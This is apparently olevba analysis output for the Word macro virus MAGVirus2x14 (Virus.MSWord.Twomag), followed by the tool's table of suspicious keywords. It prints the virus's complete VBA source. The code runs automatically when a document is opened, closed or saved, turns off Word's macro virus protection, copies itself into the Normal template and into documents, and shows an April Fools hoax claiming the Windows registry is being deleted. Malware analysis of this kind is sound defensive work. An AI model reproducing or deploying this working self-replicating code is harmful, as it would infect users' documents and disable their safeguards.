olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Twomag
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Twomag - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MAGVirus2x14.bas 
in file: Virus.MSWord.Twomag - OLE stream: 'Macros/VBA/MAGVirus2x14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'2x14
On Error Resume Next
Application.Options.VirusProtection = False
Application.Options.SaveNormalPrompt = False
Application.Options.ConfirmConversions = False
Call InfectNormal
Call Bomba
Call InfectDoc
End Sub

Sub AutoClose()
On Error Resume Next
Call InfectDoc
Call Bomba
Call Desinfect
End Sub

Sub AutoExec()
On Error Resume Next
Call InfectNormal
Call InfectDoc
Call Bomba
End Sub

Sub FileSave()
On Error Resume Next
Call InfectDoc
Call Bomba
ActiveDocument.Save
End Sub

Sub InfectNormal()
On Error Resume Next
Dim l As Long
Dim nfound As Boolean
l = 1
nfound = False
For l = 1 To NormalTemplate.VBProject.VBComponents.Count
   If NormalTemplate.VBProject.VBComponents.Item(l).CodeModule.Lines(2, 1) = "'2x14" Then nfound = True
Next l
If Not nfound Then Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "MAGVirus2x14", wdOrganizerObjectProjectItems
If NormalTemplate.Saved = False Then NormalTemplate.Save
End Sub

Sub InfectDoc()
On Error Resume Next
Dim l As Long
Dim dfound As Boolean
l = 1
dfound = False
For l = 1 To ActiveDocument.VBProject.VBComponents.Count
   If ActiveDocument.VBProject.VBComponents.Item(l).CodeModule.Lines(2, 1) = "'2x14" Then dfound = True
 Next l
If Not dfound Then
    NormalTemplate.VBProject.VBComponents("MAGVirus2x14").Export ("c:\mag.tmp")
    ActiveDocument.VBProject.VBComponents.Import ("c:\mag.tmp")
    ActiveDocument.SaveAs ActiveDocument.FullName
    Kill ("c:\mag.tmp")
  End If
End Sub

Sub Bomba()
On Error Resume Next
If (Day(Now()) = 1) And (Month(Now()) = 4) Then
 MsgBox "Ïðîåêò âèðóñà MAGVirus2x14 ïðîõîäèò èñïûòàíèå... ", vbInformation
 MsgBox "Â äàííûé ìîìåíò MAGVirus2x14...", vbInformation
 MsgBox " óäàëÿåò ñèñòåìíûé ðååñòð WINDOWS!", vbInformation
 MsgBox "...ØÓÒÊÀ!!!   :P", vbInformation
End If
End Sub

Sub Desinfect()
With Application.FileSearch
   .NewSearch
   .LookIn = "C:\"
   .SearchSubFolders = False
   .FileName = "remove_2x14_projects.mag"
   .MatchTextExactly = False
   .FileType = msoFileTypeAllFiles
   .Execute
   If .FoundFiles.Count > 0 Then Call MagRemover
  End With
End Sub

Sub MagRemover()
Dim wd As Object
Dim r As Long
Set wd = Application.VBE.ActiveVBProject.VBComponents
For r = 1 To wd.Count
 If Application.VBE.ActiveVBProject.VBComponents(r).Name = "MAGVirus2x14" Then
    MsgBox "Óäàëåíèå âèðóñà MAGVirus2x14 èç ïðîåêòà...", vbInformation
    wd.Remove Application.VBE.ActiveVBProject.VBComponents(r)
   End If
Next r
ActiveDocument.SaveAs ActiveDocument.FullName
r = 1
Set wd = NormalTemplate.VBProject.VBComponents
For r = 1 To wd.Count
 If NormalTemplate.VBProject.VBComponents(r).Name = "MAGVirus2x14" Then
    MsgBox "Óäàëåíèå âèðóñà MAGVirus2x14 èç øàáëîíà...", vbInformation
    wd.Remove NormalTemplate.VBProject.VBComponents(r)
   End If
Next r
NormalTemplate.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

